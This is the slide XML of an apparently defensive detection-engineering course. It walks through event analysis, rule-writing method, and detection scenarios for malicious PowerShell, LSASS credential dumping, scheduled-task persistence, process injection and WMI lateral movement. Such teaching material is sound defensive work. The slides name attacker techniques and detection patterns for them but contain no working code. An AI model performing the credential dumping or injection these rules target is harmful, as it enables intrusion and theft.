          </p:nvPr>
        </p:nvSpPr>
        <p:spPr>
          <a:xfrm>
            <a:off x="4976529" y="37363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4. Determine: Benign or Malicious?</a:t>
            </a:r>
            <a:endParaRPr/>
          </a:p>
        </p:txBody>
      </p:sp>
      <p:sp>
        <p:nvSpPr>
          <p:cNvPr id="1246" name="Google Shape;1246;p100"/>
          <p:cNvSpPr txBox="1"/>
          <p:nvPr>
            <p:ph idx="7" type="title"/>
          </p:nvPr>
        </p:nvSpPr>
        <p:spPr>
          <a:xfrm>
            <a:off x="6600900" y="35662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5. Document findings</a:t>
            </a:r>
            <a:endParaRPr/>
          </a:p>
        </p:txBody>
      </p:sp>
      <p:sp>
        <p:nvSpPr>
          <p:cNvPr id="1247" name="Google Shape;1247;p100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rPr lang="en"/>
              <a:t>Pattern Recognition</a:t>
            </a:r>
            <a:endParaRPr/>
          </a:p>
        </p:txBody>
      </p:sp>
      <p:sp>
        <p:nvSpPr>
          <p:cNvPr id="1248" name="Google Shape;1248;p100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Persistence</a:t>
            </a:r>
            <a:endParaRPr/>
          </a:p>
        </p:txBody>
      </p:sp>
      <p:sp>
        <p:nvSpPr>
          <p:cNvPr id="1249" name="Google Shape;1249;p100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Details</a:t>
            </a:r>
            <a:endParaRPr/>
          </a:p>
        </p:txBody>
      </p:sp>
      <p:sp>
        <p:nvSpPr>
          <p:cNvPr id="1250" name="Google Shape;1250;p100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rPr lang="en"/>
              <a:t>Understand Context</a:t>
            </a:r>
            <a:endParaRPr/>
          </a:p>
        </p:txBody>
      </p:sp>
      <p:sp>
        <p:nvSpPr>
          <p:cNvPr id="1251" name="Google Shape;1251;p100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rPr lang="en"/>
              <a:t>Baseline knowledge</a:t>
            </a:r>
            <a:endParaRPr/>
          </a:p>
        </p:txBody>
      </p:sp>
      <p:sp>
        <p:nvSpPr>
          <p:cNvPr id="1252" name="Google Shape;1252;p100"/>
          <p:cNvSpPr txBox="1"/>
          <p:nvPr>
            <p:ph idx="1" type="subTitle"/>
          </p:nvPr>
        </p:nvSpPr>
        <p:spPr>
          <a:xfrm>
            <a:off x="252425" y="1687975"/>
            <a:ext cx="2801700" cy="92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"Logs don't lie, but you need to know how to read them"</a:t>
            </a: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/>
          <p:cNvSpPr txBox="1"/>
          <p:nvPr>
            <p:ph type="title"/>
          </p:nvPr>
        </p:nvSpPr>
        <p:spPr>
          <a:xfrm>
            <a:off x="236900" y="610722"/>
            <a:ext cx="3576600" cy="10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WHO? → User, Process owner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WHAT? → Action performed, Process executed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WHEN? → Timestamp, Timeline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WHERE? → Hostname, IP, File path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WHY? → Purpose (legitimate or malicious?)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HOW? → Method, Technique, Tool </a:t>
            </a:r>
            <a:endParaRPr/>
          </a:p>
        </p:txBody>
      </p:sp>
      <p:sp>
        <p:nvSpPr>
          <p:cNvPr id="1258" name="Google Shape;1258;p101"/>
          <p:cNvSpPr txBox="1"/>
          <p:nvPr>
            <p:ph idx="2" type="title"/>
          </p:nvPr>
        </p:nvSpPr>
        <p:spPr>
          <a:xfrm>
            <a:off x="236891" y="203879"/>
            <a:ext cx="64803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100"/>
              <a:t>ANALYZING ANY SECURITY EVENT_</a:t>
            </a:r>
            <a:endParaRPr sz="2100"/>
          </a:p>
        </p:txBody>
      </p:sp>
      <p:sp>
        <p:nvSpPr>
          <p:cNvPr id="1259" name="Google Shape;1259;p101"/>
          <p:cNvSpPr txBox="1"/>
          <p:nvPr>
            <p:ph idx="1" type="subTitle"/>
          </p:nvPr>
        </p:nvSpPr>
        <p:spPr>
          <a:xfrm>
            <a:off x="236900" y="2073200"/>
            <a:ext cx="6948300" cy="245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Example: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WHO: 	SYSTEM account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WHAT: 	PowerShell.exe executed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WHEN: 	2024-03-15 02:34:12 AM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WHERE: 	WORKSTATION-05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WHY: 	Suspicious (middle of night)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none"/>
              <a:t>HOW: 	Via scheduled task (T1053.005)</a:t>
            </a:r>
            <a:endParaRPr u="none"/>
          </a:p>
        </p:txBody>
      </p:sp>
      <p:sp>
        <p:nvSpPr>
          <p:cNvPr id="1260" name="Google Shape;1260;p101"/>
          <p:cNvSpPr txBox="1"/>
          <p:nvPr>
            <p:ph type="title"/>
          </p:nvPr>
        </p:nvSpPr>
        <p:spPr>
          <a:xfrm>
            <a:off x="236900" y="2073203"/>
            <a:ext cx="3576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300"/>
              <a:t>Apply this to EVERY event you analyze.</a:t>
            </a:r>
            <a:endParaRPr b="1" sz="1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02"/>
          <p:cNvSpPr txBox="1"/>
          <p:nvPr>
            <p:ph type="title"/>
          </p:nvPr>
        </p:nvSpPr>
        <p:spPr>
          <a:xfrm>
            <a:off x="541325" y="742950"/>
            <a:ext cx="48753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5900"/>
              <a:t>FROM OBSERVATION TO DETECTION_</a:t>
            </a:r>
            <a:endParaRPr sz="5900"/>
          </a:p>
        </p:txBody>
      </p:sp>
      <p:sp>
        <p:nvSpPr>
          <p:cNvPr id="1266" name="Google Shape;1266;p102"/>
          <p:cNvSpPr txBox="1"/>
          <p:nvPr>
            <p:ph idx="3" type="subTitle"/>
          </p:nvPr>
        </p:nvSpPr>
        <p:spPr>
          <a:xfrm>
            <a:off x="5272300" y="655050"/>
            <a:ext cx="3128700" cy="4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/>
              <a:t>The Scientific Method for Detection Engineering:</a:t>
            </a:r>
            <a:endParaRPr b="1"/>
          </a:p>
        </p:txBody>
      </p:sp>
      <p:sp>
        <p:nvSpPr>
          <p:cNvPr id="1267" name="Google Shape;1267;p102"/>
          <p:cNvSpPr txBox="1"/>
          <p:nvPr>
            <p:ph idx="5" type="subTitle"/>
          </p:nvPr>
        </p:nvSpPr>
        <p:spPr>
          <a:xfrm>
            <a:off x="5619075" y="1179625"/>
            <a:ext cx="2436300" cy="33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1. OBSERVE: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Notice suspicious pattern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"PowerShell running from temp directory"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↓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2. HYPOTHESIZE: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Form detection theory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"Malware often runs PS from temp locations"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↓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3. TEST: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Validate with known goods/bads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"Check 100 legitimate PS executions - none from temp"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↓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4. DETECT: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Write the rule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"Alert if PS runs from %TEMP% or %APPDATA%"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↓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5. VALIDATE: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Test in production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"Run for 1 week, analyze false positives"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↓ </a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en" sz="1000"/>
              <a:t>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6. REFINE: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Improve the rule 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"Whitelist known applications"</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en" sz="1000"/>
              <a:t>? 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03"/>
          <p:cNvSpPr txBox="1"/>
          <p:nvPr>
            <p:ph type="title"/>
          </p:nvPr>
        </p:nvSpPr>
        <p:spPr>
          <a:xfrm>
            <a:off x="237641" y="203879"/>
            <a:ext cx="64803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TODAY'S DETECTION SCENARIOS_</a:t>
            </a:r>
            <a:endParaRPr/>
          </a:p>
        </p:txBody>
      </p:sp>
      <p:sp>
        <p:nvSpPr>
          <p:cNvPr id="1273" name="Google Shape;1273;p103"/>
          <p:cNvSpPr txBox="1"/>
          <p:nvPr>
            <p:ph idx="1" type="subTitle"/>
          </p:nvPr>
        </p:nvSpPr>
        <p:spPr>
          <a:xfrm>
            <a:off x="1214225" y="742950"/>
            <a:ext cx="7120200" cy="389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Scenario 1: Malicious PowerShell Execution →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 encoded commands and download cradles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Scenario 2: Credential Dumping (LSASS Access) →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 suspicious process access to lsass.exe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Scenario 3: Persistence via Scheduled Task →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 schtasks.exe creating tasks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non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04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YOUR DETECTION TOOLKIT TODAY_</a:t>
            </a:r>
            <a:endParaRPr/>
          </a:p>
        </p:txBody>
      </p:sp>
      <p:sp>
        <p:nvSpPr>
          <p:cNvPr id="1279" name="Google Shape;1279;p104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Add tag</a:t>
            </a:r>
            <a:endParaRPr/>
          </a:p>
        </p:txBody>
      </p:sp>
      <p:sp>
        <p:nvSpPr>
          <p:cNvPr id="1280" name="Google Shape;1280;p104"/>
          <p:cNvSpPr txBox="1"/>
          <p:nvPr>
            <p:ph idx="14" type="title"/>
          </p:nvPr>
        </p:nvSpPr>
        <p:spPr>
          <a:xfrm>
            <a:off x="1701724" y="1324050"/>
            <a:ext cx="2767200" cy="1558200"/>
          </a:xfrm>
          <a:prstGeom prst="rect">
            <a:avLst/>
          </a:prstGeom>
        </p:spPr>
        <p:txBody>
          <a:bodyPr anchorCtr="0" anchor="ctr" bIns="135100" lIns="135100" spcFirstLastPara="1" rIns="135100" wrap="square" tIns="1351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WAZUH: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✓ Real-time event stream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✓ Rule testing interface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✓ Custom rule creation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✓ Alert visualization</a:t>
            </a:r>
            <a:endParaRPr sz="1477"/>
          </a:p>
        </p:txBody>
      </p:sp>
      <p:sp>
        <p:nvSpPr>
          <p:cNvPr id="1281" name="Google Shape;1281;p104"/>
          <p:cNvSpPr txBox="1"/>
          <p:nvPr>
            <p:ph idx="14" type="title"/>
          </p:nvPr>
        </p:nvSpPr>
        <p:spPr>
          <a:xfrm>
            <a:off x="4675088" y="1324050"/>
            <a:ext cx="2767200" cy="1558200"/>
          </a:xfrm>
          <a:prstGeom prst="rect">
            <a:avLst/>
          </a:prstGeom>
        </p:spPr>
        <p:txBody>
          <a:bodyPr anchorCtr="0" anchor="ctr" bIns="135100" lIns="135100" spcFirstLastPara="1" rIns="135100" wrap="square" tIns="1351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VELOCIRAPTOR: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✓ VQL queries for hunting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✓ Artifact collection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✓ Timeline analysis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✓ Deep forensics</a:t>
            </a:r>
            <a:endParaRPr sz="1477"/>
          </a:p>
        </p:txBody>
      </p:sp>
      <p:sp>
        <p:nvSpPr>
          <p:cNvPr id="1282" name="Google Shape;1282;p104"/>
          <p:cNvSpPr txBox="1"/>
          <p:nvPr>
            <p:ph idx="14" type="title"/>
          </p:nvPr>
        </p:nvSpPr>
        <p:spPr>
          <a:xfrm>
            <a:off x="4675069" y="3099595"/>
            <a:ext cx="2767200" cy="1558200"/>
          </a:xfrm>
          <a:prstGeom prst="rect">
            <a:avLst/>
          </a:prstGeom>
        </p:spPr>
        <p:txBody>
          <a:bodyPr anchorCtr="0" anchor="ctr" bIns="135100" lIns="135100" spcFirstLastPara="1" rIns="135100" wrap="square" tIns="1351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rPr lang="en" sz="1477"/>
              <a:t>SYSMON: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rPr lang="en" sz="1477"/>
              <a:t>✓ Detailed process telemetry ✓ Network connections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rPr lang="en" sz="1477"/>
              <a:t>✓ Registry/File activity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rPr lang="en" sz="1477"/>
              <a:t>✓ Process injection detection </a:t>
            </a:r>
            <a:endParaRPr sz="1477"/>
          </a:p>
        </p:txBody>
      </p:sp>
      <p:sp>
        <p:nvSpPr>
          <p:cNvPr id="1283" name="Google Shape;1283;p104"/>
          <p:cNvSpPr txBox="1"/>
          <p:nvPr>
            <p:ph idx="14" type="title"/>
          </p:nvPr>
        </p:nvSpPr>
        <p:spPr>
          <a:xfrm>
            <a:off x="1701706" y="3099595"/>
            <a:ext cx="2767200" cy="15582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100" lIns="135100" spcFirstLastPara="1" rIns="135100" wrap="square" tIns="1351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CALDERA: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✓ Attack simulation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✓ Technique validation </a:t>
            </a:r>
            <a:endParaRPr sz="1477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38"/>
              <a:buNone/>
            </a:pPr>
            <a:r>
              <a:rPr lang="en" sz="1477"/>
              <a:t>✓ Rule testing</a:t>
            </a:r>
            <a:endParaRPr sz="1477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8" name="Google Shape;1288;p105"/>
          <p:cNvGrpSpPr/>
          <p:nvPr/>
        </p:nvGrpSpPr>
        <p:grpSpPr>
          <a:xfrm>
            <a:off x="0" y="1917000"/>
            <a:ext cx="2846403" cy="3226550"/>
            <a:chOff x="0" y="1917000"/>
            <a:chExt cx="2846403" cy="3226550"/>
          </a:xfrm>
        </p:grpSpPr>
        <p:sp>
          <p:nvSpPr>
            <p:cNvPr id="1289" name="Google Shape;1289;p105"/>
            <p:cNvSpPr/>
            <p:nvPr/>
          </p:nvSpPr>
          <p:spPr>
            <a:xfrm>
              <a:off x="0" y="191700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0" name="Google Shape;1290;p105"/>
            <p:cNvSpPr/>
            <p:nvPr/>
          </p:nvSpPr>
          <p:spPr>
            <a:xfrm>
              <a:off x="583203" y="219527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1" name="Google Shape;1291;p105"/>
            <p:cNvSpPr/>
            <p:nvPr/>
          </p:nvSpPr>
          <p:spPr>
            <a:xfrm>
              <a:off x="406231" y="2863118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2" name="Google Shape;1292;p105"/>
            <p:cNvSpPr/>
            <p:nvPr/>
          </p:nvSpPr>
          <p:spPr>
            <a:xfrm>
              <a:off x="0" y="3709850"/>
              <a:ext cx="2263200" cy="1433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3" name="Google Shape;1293;p105"/>
            <p:cNvSpPr/>
            <p:nvPr/>
          </p:nvSpPr>
          <p:spPr>
            <a:xfrm>
              <a:off x="406225" y="3904091"/>
              <a:ext cx="2263200" cy="123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1294" name="Google Shape;1294;p105"/>
          <p:cNvGrpSpPr/>
          <p:nvPr/>
        </p:nvGrpSpPr>
        <p:grpSpPr>
          <a:xfrm>
            <a:off x="3039975" y="1917000"/>
            <a:ext cx="6103900" cy="3226630"/>
            <a:chOff x="3039975" y="1917000"/>
            <a:chExt cx="6103900" cy="3226630"/>
          </a:xfrm>
        </p:grpSpPr>
        <p:sp>
          <p:nvSpPr>
            <p:cNvPr id="1295" name="Google Shape;1295;p105"/>
            <p:cNvSpPr/>
            <p:nvPr/>
          </p:nvSpPr>
          <p:spPr>
            <a:xfrm>
              <a:off x="3039975" y="1917000"/>
              <a:ext cx="61038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6" name="Google Shape;1296;p105"/>
            <p:cNvSpPr/>
            <p:nvPr/>
          </p:nvSpPr>
          <p:spPr>
            <a:xfrm>
              <a:off x="3039975" y="3949323"/>
              <a:ext cx="1851000" cy="119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7" name="Google Shape;1297;p105"/>
            <p:cNvSpPr/>
            <p:nvPr/>
          </p:nvSpPr>
          <p:spPr>
            <a:xfrm>
              <a:off x="5802775" y="1917000"/>
              <a:ext cx="3341100" cy="286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8" name="Google Shape;1298;p105"/>
            <p:cNvSpPr/>
            <p:nvPr/>
          </p:nvSpPr>
          <p:spPr>
            <a:xfrm>
              <a:off x="5730500" y="2475475"/>
              <a:ext cx="2187000" cy="1661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9" name="Google Shape;1299;p105"/>
            <p:cNvSpPr/>
            <p:nvPr/>
          </p:nvSpPr>
          <p:spPr>
            <a:xfrm>
              <a:off x="5730500" y="3793330"/>
              <a:ext cx="2219100" cy="135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00" name="Google Shape;1300;p105"/>
            <p:cNvSpPr/>
            <p:nvPr/>
          </p:nvSpPr>
          <p:spPr>
            <a:xfrm>
              <a:off x="6966550" y="3523794"/>
              <a:ext cx="1853700" cy="1619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01" name="Google Shape;1301;p105"/>
            <p:cNvSpPr/>
            <p:nvPr/>
          </p:nvSpPr>
          <p:spPr>
            <a:xfrm>
              <a:off x="4236950" y="3217426"/>
              <a:ext cx="1851000" cy="1269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02" name="Google Shape;1302;p105"/>
            <p:cNvSpPr/>
            <p:nvPr/>
          </p:nvSpPr>
          <p:spPr>
            <a:xfrm>
              <a:off x="3039975" y="2928954"/>
              <a:ext cx="18510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03" name="Google Shape;1303;p105"/>
            <p:cNvSpPr/>
            <p:nvPr/>
          </p:nvSpPr>
          <p:spPr>
            <a:xfrm>
              <a:off x="4236950" y="3899475"/>
              <a:ext cx="1851000" cy="1244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304" name="Google Shape;1304;p105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What We’ve Learned</a:t>
            </a:r>
            <a:endParaRPr/>
          </a:p>
        </p:txBody>
      </p:sp>
      <p:sp>
        <p:nvSpPr>
          <p:cNvPr id="1305" name="Google Shape;1305;p105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What’s Next</a:t>
            </a:r>
            <a:endParaRPr/>
          </a:p>
        </p:txBody>
      </p:sp>
      <p:sp>
        <p:nvSpPr>
          <p:cNvPr id="1306" name="Google Shape;1306;p105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LET’S DO A SHORT RECAP</a:t>
            </a:r>
            <a:endParaRPr/>
          </a:p>
        </p:txBody>
      </p:sp>
      <p:sp>
        <p:nvSpPr>
          <p:cNvPr id="1307" name="Google Shape;1307;p105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✓ Basic signature detection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✓ Pattern-based rules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✓ Single-event detection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08" name="Google Shape;1308;p105"/>
          <p:cNvSpPr txBox="1"/>
          <p:nvPr>
            <p:ph type="title"/>
          </p:nvPr>
        </p:nvSpPr>
        <p:spPr>
          <a:xfrm>
            <a:off x="221375" y="223900"/>
            <a:ext cx="72942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LEVEL UP: ADVANCED DETECTION_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1309" name="Google Shape;1309;p105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/>
              <a:t>Previously we learned how to detect and make rule for single event…</a:t>
            </a:r>
            <a:br>
              <a:rPr lang="en"/>
            </a:br>
            <a:br>
              <a:rPr lang="en"/>
            </a:br>
            <a:r>
              <a:rPr lang="en"/>
              <a:t>BUT we did not touch the full killchain!</a:t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10" name="Google Shape;1310;p105"/>
          <p:cNvSpPr txBox="1"/>
          <p:nvPr>
            <p:ph idx="4" type="subTitle"/>
          </p:nvPr>
        </p:nvSpPr>
        <p:spPr>
          <a:xfrm>
            <a:off x="252425" y="908888"/>
            <a:ext cx="31863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"Advanced attackers require advanced detection"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11" name="Google Shape;1311;p105"/>
          <p:cNvSpPr txBox="1"/>
          <p:nvPr>
            <p:ph idx="1" type="body"/>
          </p:nvPr>
        </p:nvSpPr>
        <p:spPr>
          <a:xfrm>
            <a:off x="6173451" y="2370320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→ Behavioral detection (event chains)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→ Correlation rules (multiple events)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→ Context-aware detection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→ Advanced evasion detection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12" name="Google Shape;1312;p105"/>
          <p:cNvSpPr/>
          <p:nvPr/>
        </p:nvSpPr>
        <p:spPr>
          <a:xfrm>
            <a:off x="2669427" y="4777621"/>
            <a:ext cx="418200" cy="36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106"/>
          <p:cNvSpPr txBox="1"/>
          <p:nvPr>
            <p:ph type="title"/>
          </p:nvPr>
        </p:nvSpPr>
        <p:spPr>
          <a:xfrm>
            <a:off x="237641" y="203879"/>
            <a:ext cx="64803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COMPLETING THE DETECTION ARSENAL_</a:t>
            </a:r>
            <a:endParaRPr/>
          </a:p>
        </p:txBody>
      </p:sp>
      <p:sp>
        <p:nvSpPr>
          <p:cNvPr id="1318" name="Google Shape;1318;p106"/>
          <p:cNvSpPr txBox="1"/>
          <p:nvPr>
            <p:ph idx="1" type="subTitle"/>
          </p:nvPr>
        </p:nvSpPr>
        <p:spPr>
          <a:xfrm>
            <a:off x="1214225" y="742950"/>
            <a:ext cx="7120200" cy="389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Scenario 4: Suspicious Process Injection →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 CreateRemoteThread API calls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Scenario 5: WMI Lateral Movement →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 remote WMI process creation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Scenario 6: Malicious Service Creation →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 sc.exe or registry service modifications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scenario: Analyze → Hypothesize → Detect → Test</a:t>
            </a:r>
            <a:endParaRPr u="non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07"/>
          <p:cNvSpPr/>
          <p:nvPr/>
        </p:nvSpPr>
        <p:spPr>
          <a:xfrm>
            <a:off x="6153000" y="1420300"/>
            <a:ext cx="2991000" cy="125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24" name="Google Shape;1324;p107"/>
          <p:cNvSpPr/>
          <p:nvPr/>
        </p:nvSpPr>
        <p:spPr>
          <a:xfrm>
            <a:off x="5057775" y="2615613"/>
            <a:ext cx="2991000" cy="1254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25" name="Google Shape;1325;p107"/>
          <p:cNvSpPr txBox="1"/>
          <p:nvPr>
            <p:ph idx="4294967295" type="subTitle"/>
          </p:nvPr>
        </p:nvSpPr>
        <p:spPr>
          <a:xfrm>
            <a:off x="5994225" y="2852263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✓ Suspicious memory permissions</a:t>
            </a:r>
            <a:endParaRPr sz="1000"/>
          </a:p>
        </p:txBody>
      </p:sp>
      <p:sp>
        <p:nvSpPr>
          <p:cNvPr id="1326" name="Google Shape;1326;p107"/>
          <p:cNvSpPr/>
          <p:nvPr/>
        </p:nvSpPr>
        <p:spPr>
          <a:xfrm>
            <a:off x="3076500" y="3772500"/>
            <a:ext cx="2991000" cy="125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27" name="Google Shape;1327;p107"/>
          <p:cNvSpPr txBox="1"/>
          <p:nvPr>
            <p:ph idx="4294967295" type="subTitle"/>
          </p:nvPr>
        </p:nvSpPr>
        <p:spPr>
          <a:xfrm>
            <a:off x="4012950" y="3934500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>
                <a:solidFill>
                  <a:schemeClr val="lt2"/>
                </a:solidFill>
              </a:rPr>
              <a:t>✓ Unusual process relationships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328" name="Google Shape;1328;p107"/>
          <p:cNvSpPr/>
          <p:nvPr/>
        </p:nvSpPr>
        <p:spPr>
          <a:xfrm>
            <a:off x="252600" y="3429125"/>
            <a:ext cx="2991000" cy="12546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29" name="Google Shape;1329;p107"/>
          <p:cNvSpPr txBox="1"/>
          <p:nvPr>
            <p:ph idx="4294967295" type="subTitle"/>
          </p:nvPr>
        </p:nvSpPr>
        <p:spPr>
          <a:xfrm>
            <a:off x="1189050" y="3652463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Sysmon Event ID 10 (Process Access)</a:t>
            </a:r>
            <a:endParaRPr sz="1000"/>
          </a:p>
        </p:txBody>
      </p:sp>
      <p:sp>
        <p:nvSpPr>
          <p:cNvPr id="1330" name="Google Shape;1330;p107"/>
          <p:cNvSpPr/>
          <p:nvPr/>
        </p:nvSpPr>
        <p:spPr>
          <a:xfrm>
            <a:off x="743550" y="4886747"/>
            <a:ext cx="2991000" cy="2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31" name="Google Shape;1331;p107"/>
          <p:cNvSpPr/>
          <p:nvPr/>
        </p:nvSpPr>
        <p:spPr>
          <a:xfrm>
            <a:off x="6259200" y="4003350"/>
            <a:ext cx="2884800" cy="114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Example: </a:t>
            </a:r>
            <a:endParaRPr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malware.exe → injects → explorer.exe</a:t>
            </a:r>
            <a:endParaRPr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32" name="Google Shape;1332;p107"/>
          <p:cNvSpPr/>
          <p:nvPr/>
        </p:nvSpPr>
        <p:spPr>
          <a:xfrm>
            <a:off x="8400300" y="2671550"/>
            <a:ext cx="743700" cy="125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33" name="Google Shape;1333;p107"/>
          <p:cNvSpPr/>
          <p:nvPr/>
        </p:nvSpPr>
        <p:spPr>
          <a:xfrm>
            <a:off x="8147700" y="0"/>
            <a:ext cx="996300" cy="125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grpSp>
        <p:nvGrpSpPr>
          <p:cNvPr id="1334" name="Google Shape;1334;p107"/>
          <p:cNvGrpSpPr/>
          <p:nvPr/>
        </p:nvGrpSpPr>
        <p:grpSpPr>
          <a:xfrm>
            <a:off x="5310010" y="608711"/>
            <a:ext cx="443595" cy="452628"/>
            <a:chOff x="1242900" y="238125"/>
            <a:chExt cx="5134200" cy="5238750"/>
          </a:xfrm>
        </p:grpSpPr>
        <p:sp>
          <p:nvSpPr>
            <p:cNvPr id="1335" name="Google Shape;1335;p107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36" name="Google Shape;1336;p107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37" name="Google Shape;1337;p107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38" name="Google Shape;1338;p107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39" name="Google Shape;1339;p107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40" name="Google Shape;1340;p107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41" name="Google Shape;1341;p107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42" name="Google Shape;1342;p107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43" name="Google Shape;1343;p107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44" name="Google Shape;1344;p107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45" name="Google Shape;1345;p107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346" name="Google Shape;1346;p107"/>
          <p:cNvGrpSpPr/>
          <p:nvPr/>
        </p:nvGrpSpPr>
        <p:grpSpPr>
          <a:xfrm>
            <a:off x="5422276" y="3016598"/>
            <a:ext cx="443595" cy="452628"/>
            <a:chOff x="1242900" y="238125"/>
            <a:chExt cx="5134200" cy="5238750"/>
          </a:xfrm>
        </p:grpSpPr>
        <p:sp>
          <p:nvSpPr>
            <p:cNvPr id="1347" name="Google Shape;1347;p107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48" name="Google Shape;1348;p107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49" name="Google Shape;1349;p107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50" name="Google Shape;1350;p107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51" name="Google Shape;1351;p107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52" name="Google Shape;1352;p107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53" name="Google Shape;1353;p107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54" name="Google Shape;1354;p107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55" name="Google Shape;1355;p107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56" name="Google Shape;1356;p107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57" name="Google Shape;1357;p107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358" name="Google Shape;1358;p107"/>
          <p:cNvGrpSpPr/>
          <p:nvPr/>
        </p:nvGrpSpPr>
        <p:grpSpPr>
          <a:xfrm>
            <a:off x="3438638" y="4133211"/>
            <a:ext cx="443595" cy="452628"/>
            <a:chOff x="1242900" y="238125"/>
            <a:chExt cx="5134200" cy="5238750"/>
          </a:xfrm>
        </p:grpSpPr>
        <p:sp>
          <p:nvSpPr>
            <p:cNvPr id="1359" name="Google Shape;1359;p107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0" name="Google Shape;1360;p107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1" name="Google Shape;1361;p107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2" name="Google Shape;1362;p107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3" name="Google Shape;1363;p107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4" name="Google Shape;1364;p107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5" name="Google Shape;1365;p107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6" name="Google Shape;1366;p107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7" name="Google Shape;1367;p107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8" name="Google Shape;1368;p107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9" name="Google Shape;1369;p107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370" name="Google Shape;1370;p107"/>
          <p:cNvGrpSpPr/>
          <p:nvPr/>
        </p:nvGrpSpPr>
        <p:grpSpPr>
          <a:xfrm>
            <a:off x="615735" y="3831770"/>
            <a:ext cx="443595" cy="452628"/>
            <a:chOff x="1242900" y="238125"/>
            <a:chExt cx="5134200" cy="5238750"/>
          </a:xfrm>
        </p:grpSpPr>
        <p:sp>
          <p:nvSpPr>
            <p:cNvPr id="1371" name="Google Shape;1371;p107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2" name="Google Shape;1372;p107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3" name="Google Shape;1373;p107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4" name="Google Shape;1374;p107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5" name="Google Shape;1375;p107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6" name="Google Shape;1376;p107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7" name="Google Shape;1377;p107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8" name="Google Shape;1378;p107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9" name="Google Shape;1379;p107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80" name="Google Shape;1380;p107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81" name="Google Shape;1381;p107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382" name="Google Shape;1382;p107"/>
          <p:cNvSpPr txBox="1"/>
          <p:nvPr>
            <p:ph idx="1" type="subTitle"/>
          </p:nvPr>
        </p:nvSpPr>
        <p:spPr>
          <a:xfrm>
            <a:off x="252600" y="1199800"/>
            <a:ext cx="2881500" cy="10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What is it?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- Inject malicious code into legitimate process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- Process appears benign (explorer.exe, svchost.exe)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- Evades process-based detection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- Common in advanced malware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3" name="Google Shape;1383;p107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PROCESS INJECTION_</a:t>
            </a:r>
            <a:endParaRPr/>
          </a:p>
        </p:txBody>
      </p:sp>
      <p:sp>
        <p:nvSpPr>
          <p:cNvPr id="1384" name="Google Shape;1384;p107"/>
          <p:cNvSpPr/>
          <p:nvPr/>
        </p:nvSpPr>
        <p:spPr>
          <a:xfrm>
            <a:off x="2346145" y="2236315"/>
            <a:ext cx="2991000" cy="12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85" name="Google Shape;1385;p107"/>
          <p:cNvSpPr txBox="1"/>
          <p:nvPr>
            <p:ph idx="4294967295" type="subTitle"/>
          </p:nvPr>
        </p:nvSpPr>
        <p:spPr>
          <a:xfrm>
            <a:off x="3282595" y="2463040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Sysmon Event ID 8 (CreateRemoteThread)</a:t>
            </a:r>
            <a:endParaRPr sz="1000"/>
          </a:p>
        </p:txBody>
      </p:sp>
      <p:grpSp>
        <p:nvGrpSpPr>
          <p:cNvPr id="1386" name="Google Shape;1386;p107"/>
          <p:cNvGrpSpPr/>
          <p:nvPr/>
        </p:nvGrpSpPr>
        <p:grpSpPr>
          <a:xfrm>
            <a:off x="2655072" y="2619798"/>
            <a:ext cx="443595" cy="452628"/>
            <a:chOff x="1242900" y="238125"/>
            <a:chExt cx="5134200" cy="5238750"/>
          </a:xfrm>
        </p:grpSpPr>
        <p:sp>
          <p:nvSpPr>
            <p:cNvPr id="1387" name="Google Shape;1387;p107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88" name="Google Shape;1388;p107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89" name="Google Shape;1389;p107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0" name="Google Shape;1390;p107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1" name="Google Shape;1391;p107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2" name="Google Shape;1392;p107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3" name="Google Shape;1393;p107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4" name="Google Shape;1394;p107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5" name="Google Shape;1395;p107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6" name="Google Shape;1396;p107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7" name="Google Shape;1397;p107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08"/>
          <p:cNvSpPr/>
          <p:nvPr/>
        </p:nvSpPr>
        <p:spPr>
          <a:xfrm>
            <a:off x="3600000" y="2425725"/>
            <a:ext cx="1696200" cy="246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03" name="Google Shape;1403;p108"/>
          <p:cNvSpPr/>
          <p:nvPr/>
        </p:nvSpPr>
        <p:spPr>
          <a:xfrm>
            <a:off x="5397600" y="2425725"/>
            <a:ext cx="1696200" cy="246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04" name="Google Shape;1404;p108"/>
          <p:cNvSpPr/>
          <p:nvPr/>
        </p:nvSpPr>
        <p:spPr>
          <a:xfrm>
            <a:off x="7195200" y="2425725"/>
            <a:ext cx="1696200" cy="246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05" name="Google Shape;1405;p108"/>
          <p:cNvSpPr txBox="1"/>
          <p:nvPr>
            <p:ph idx="1" type="body"/>
          </p:nvPr>
        </p:nvSpPr>
        <p:spPr>
          <a:xfrm>
            <a:off x="3721600" y="2628375"/>
            <a:ext cx="1384800" cy="21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System administration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Remote management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Monitoring and inventory</a:t>
            </a:r>
            <a:endParaRPr/>
          </a:p>
        </p:txBody>
      </p:sp>
      <p:sp>
        <p:nvSpPr>
          <p:cNvPr id="1406" name="Google Shape;1406;p108"/>
          <p:cNvSpPr txBox="1"/>
          <p:nvPr>
            <p:ph idx="6" type="subTitle"/>
          </p:nvPr>
        </p:nvSpPr>
        <p:spPr>
          <a:xfrm>
            <a:off x="3721600" y="2051338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LEGIT_</a:t>
            </a:r>
            <a:endParaRPr/>
          </a:p>
        </p:txBody>
      </p:sp>
      <p:sp>
        <p:nvSpPr>
          <p:cNvPr id="1407" name="Google Shape;1407;p108"/>
          <p:cNvSpPr txBox="1"/>
          <p:nvPr>
            <p:ph idx="4" type="body"/>
          </p:nvPr>
        </p:nvSpPr>
        <p:spPr>
          <a:xfrm>
            <a:off x="5511500" y="2628375"/>
            <a:ext cx="1384800" cy="21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Remote code execution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Lateral movement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Fileless execution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Persistence </a:t>
            </a:r>
            <a:endParaRPr/>
          </a:p>
        </p:txBody>
      </p:sp>
      <p:sp>
        <p:nvSpPr>
          <p:cNvPr id="1408" name="Google Shape;1408;p108"/>
          <p:cNvSpPr txBox="1"/>
          <p:nvPr>
            <p:ph idx="7" type="subTitle"/>
          </p:nvPr>
        </p:nvSpPr>
        <p:spPr>
          <a:xfrm>
            <a:off x="5511500" y="2051338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MALICIOUS_</a:t>
            </a:r>
            <a:endParaRPr/>
          </a:p>
        </p:txBody>
      </p:sp>
      <p:sp>
        <p:nvSpPr>
          <p:cNvPr id="1409" name="Google Shape;1409;p108"/>
          <p:cNvSpPr txBox="1"/>
          <p:nvPr>
            <p:ph idx="5" type="body"/>
          </p:nvPr>
        </p:nvSpPr>
        <p:spPr>
          <a:xfrm>
            <a:off x="7293075" y="2628375"/>
            <a:ext cx="1461000" cy="21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wmiprvse.exe spawning suspicious processes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Unusual parent-child relationships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Command lines with wmic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Remote WMI connections</a:t>
            </a:r>
            <a:endParaRPr/>
          </a:p>
